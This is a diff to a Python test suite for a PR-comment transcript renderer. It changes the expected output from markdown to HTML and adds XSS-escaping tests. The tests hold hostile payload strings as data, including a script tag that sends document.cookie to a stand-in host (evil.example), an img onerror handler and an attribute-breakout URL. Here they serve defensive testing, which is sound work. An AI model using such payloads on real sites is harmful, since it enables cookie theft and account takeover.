@@ -211,6 +211,53 @@ class CaptureTests(TestCase):
             _human("bob", "Second point about jitter."),
         ])
         self.assertIn("https://github.com/acme/widgets/pull/12", transcript)
-        self.assertIn("**@alice** on `client.py`:", transcript)
-        self.assertIn("**@bob**:", transcript)
-        self.assertIn("> First point about retries.", transcript)
+        self.assertIn("<strong>@alice</strong> on <code>client.py</code>:", transcript)
+        self.assertIn("<strong>@bob</strong>:", transcript)
+        self.assertIn("<blockquote><p>First point about retries.</p></blockquote>", transcript)
+
+    def test_transcript_preserves_line_breaks(self):
+        """Content is rendered as HTML, where raw newlines collapse to nothing."""
+        transcript = _build_transcript(self.pr, [
+            _human("alice", "First line.\nSecond line."),
+        ])
+        self.assertIn("<p>First line.</p><p>Second line.</p>", transcript)
+
+    # -- injection ----------------------------------------------------------
+
+    def test_comment_markup_is_escaped(self):
+        """The renderer uses dangerouslySetInnerHTML, so this is the real defence.
+
+        A PR comment is written by anyone who can comment on a connected repo —
+        on a public repository, anyone at all. Stored unescaped, markup here
+        would execute in the browser of every colleague who opened the record.
+        """
+        transcript = _build_transcript(self.pr, [
+            _human("mallory", '<img src=x onerror="alert(1)">'),
+            _human("mallory", "<script>fetch('//evil.example/'+document.cookie)</script>"),
+        ])
+        # The property that matters is that nothing opens a tag. "onerror=" is
+        # allowed to survive as literal text — inside an escaped &lt;img&gt; it
+        # is inert prose, and asserting on it would be testing the payload
+        # rather than the defence.
+        self.assertNotIn("<img", transcript)
+        self.assertNotIn("<script", transcript)
+        self.assertIn("&lt;img", transcript)
+        self.assertIn("&lt;script", transcript)
+        self.assertNotIn('onerror="alert(1)"', transcript)
+
+    def test_hostile_login_and_path_are_escaped(self):
+        transcript = _build_transcript(self.pr, [
+            {"user": {"login": "<script>x</script>", "type": "User"},
+             "body": "A comment long enough to clear the substance threshold here.",
+             "path": "<img src=x>", "created_at": "2026-08-05T09:00:00Z"},
+        ])
+        self.assertNotIn("<script>x", transcript)
+        self.assertNotIn("<img src=x>", transcript)
+
+    def test_hostile_pr_url_cannot_break_out_of_the_attribute(self):
+        pr = dict(self.pr, html_url='https://x.test/"><script>alert(1)</script>')
+        transcript = _build_transcript(pr, [
+            _human("alice", "A comment long enough to clear the substance threshold."),
+        ])
+        self.assertNotIn("<script>alert(1)</script>", transcript)
+        self.assertIn("&quot;", transcript)
